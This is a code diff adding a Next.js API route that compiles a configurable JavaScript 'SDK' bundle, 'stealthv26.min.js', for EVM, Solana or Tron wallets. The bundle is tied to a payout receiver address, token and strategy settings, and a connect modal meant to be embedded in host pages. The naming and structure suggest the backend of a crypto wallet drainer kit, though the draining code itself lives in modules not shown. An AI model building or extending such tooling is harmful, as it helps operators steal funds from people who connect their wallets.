@@ -1,0 +1,162 @@
+import { NextResponse } from "next/server";
+import { requireAuth } from "@/lib/api-auth";
+import { generateSDKBundle } from "@/lib/sdk-generator";
+import { readCompileConfig, writeCompileConfig, type CompileConfig } from "@/lib/compile-config-store";
+import { readOperationalConfig, writeOperationalConfig } from "@/lib/operational-config-store";
+import { listScriptBuilds, saveScriptBuild } from "@/lib/script-build-store";
+import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
+import {
+  defaultAdvancedConfig,
+  defaultAppKitConfig,
+  defaultContractsConfig,
+  defaultGeneralConfig,
+  defaultModalConfig,
+  defaultTokensConfig,
+  defaultWalletConfig,
+  defaultPayoutConfig,
+  defaultStrategyConfig,
+} from "@/lib/mock-data";
+
+function isRecord(value: unknown): value is Record<string, unknown> {
+  return typeof value === "object" && value !== null;
+}
+
+async function mergeCompileConfig(body: Record<string, unknown>): Promise<CompileConfig> {
+  const operational = await readOperationalConfig();
+  return {
+    general: { ...defaultGeneralConfig, ...((isRecord(body.general) ? body.general : {}) as Partial<CompileConfig["general"]>) },
+    wallet: { ...defaultWalletConfig, ...((isRecord(body.wallet) ? body.wallet : {}) as Partial<CompileConfig["wallet"]>) },
+    modal: { ...defaultModalConfig, ...((isRecord(body.modal) ? body.modal : {}) as Partial<CompileConfig["modal"]>) },
+    tokens: { ...defaultTokensConfig, ...((isRecord(body.tokens) ? body.tokens : {}) as Partial<CompileConfig["tokens"]>) },
+    advanced: { ...defaultAdvancedConfig, ...((isRecord(body.advanced) ? body.advanced : {}) as Partial<CompileConfig["advanced"]>) },
+    payout: {
+      ...defaultPayoutConfig,
+      ...operational.payout,
+      ...((isRecord(body.payout) ? body.payout : {}) as Partial<CompileConfig["payout"]>),
+    },
+    contracts: { ...defaultContractsConfig, ...operational.contracts, ...((isRecord(body.contracts) ? body.contracts : {}) as Partial<CompileConfig["contracts"]>) },
+    strategy: { ...defaultStrategyConfig, ...operational.strategy, ...((isRecord(body.strategy) ? body.strategy : {}) as Partial<CompileConfig["strategy"]>) },
+    appKit: { ...defaultAppKitConfig, ...operational.appKit, ...((isRecord(body.appKit) ? body.appKit : {}) as Partial<CompileConfig["appKit"]>) },
+  };
+}
+
+export async function GET() {
+  const guard = await requireAuth("sdk:download");
+  if (guard) return guard;
+
+  const config = await readCompileConfig();
+  const builds = await listScriptBuilds();
+  return NextResponse.json({
+    status: "ok",
+    config,
+    latestBuild: builds[0] ?? null,
+    builds,
+  });
+}
+
+export async function POST(request: Request) {
+  const guard = await requireAuth("sdk:compile");
+  if (guard) return guard;
+
+  try {
+    const body = await request.json();
+    const payload = isRecord(body) ? body : {};
+    const { receiverAddress, saveConfig = true, saveBuild = true, source = "compile" } = payload;
+
+    const timestamp = new Date().toISOString();
+    const version = "26.0.0";
+
+    const operational = await readOperationalConfig();
+    const merged = await mergeCompileConfig(payload);
+
+     if (saveConfig) {
+      await writeCompileConfig(merged);
+      
+      const updatedOperational = await readOperationalConfig();
+      updatedOperational.payout = merged.payout;
+      await writeOperationalConfig(updatedOperational);
+    }
+
+    const compiledConfig = {
+      version,
+      timestamp,
+      general: merged.general,
+      wallet: merged.wallet,
+      modal: merged.modal,
+      tokens: merged.tokens,
+      advanced: merged.advanced,
+      payout: merged.payout,
+      contracts: merged.contracts,
+      strategy: merged.strategy,
+      appKit: merged.appKit,
+    };
+
+    const resolvedReceiver =
+      (typeof receiverAddress === "string" && receiverAddress) ||
+      operational.payout?.address ||
+      merged.payout.address ||
+      "0x0000000000000000000000000000000000000000";
+
+    const sdkBundle =
+      merged.general.ecosystem === "solana"
+        ? generateSolanaBundle({
+            general: merged.general,
+            wallet: merged.wallet,
+            modal: merged.modal,
+            tokens: merged.tokens,
+            advanced: merged.advanced,
+            receiverAddress: resolvedReceiver,
+          })
+        : merged.general.ecosystem === "tron"
+          ? generateTronBundle({
+              general: merged.general,
+              wallet: merged.wallet,
+              modal: merged.modal,
+              tokens: merged.tokens,
+              advanced: merged.advanced,
+              receiverAddress: resolvedReceiver,
+            })
+          : generateSDKBundle({
+              general: merged.general,
+              wallet: merged.wallet,
+              // Match GET /api/sdk: embeds need window.StealthV26 / openConnectModal for self-test & host pages.
+              modal: { ...merged.modal, exposeExternalSDK: true },
+              tokens: merged.tokens,
+              advanced: merged.advanced,
+              contracts: merged.contracts,
+              strategy: merged.strategy,
+              appKit: merged.appKit,
+              receiverAddress: resolvedReceiver,
+            });
+
+    const build = saveBuild
+      ? await saveScriptBuild({
+          bundle: sdkBundle,
+          framework: merged.modal.modalFrameworkStyle,
+          source: source === "frontpage" ? "frontpage" : "compile",
+        })
+      : null;
+
+    return NextResponse.json({
+      status: "ok",
+      message: "SDK compiled successfully",
+      timestamp,
+      version,
+      bundle: {
+        content: sdkBundle,
+        size: sdkBundle.length,
+        sizeKB: (sdkBundle.length / 1024).toFixed(2),
+        filename: "stealthv26.min.js",
+      },
+      publishedBuild: build,
+      config: compiledConfig,
+    });
+   } catch (error) {
+     const errorMessage = error instanceof Error ? error.message : "Compilation failed";
+     console.error("[compile/POST] Error:", errorMessage, error);
+     return NextResponse.json(
+       { status: "error", message: errorMessage },
+       { status: 500 }
+     );
+   }
+}
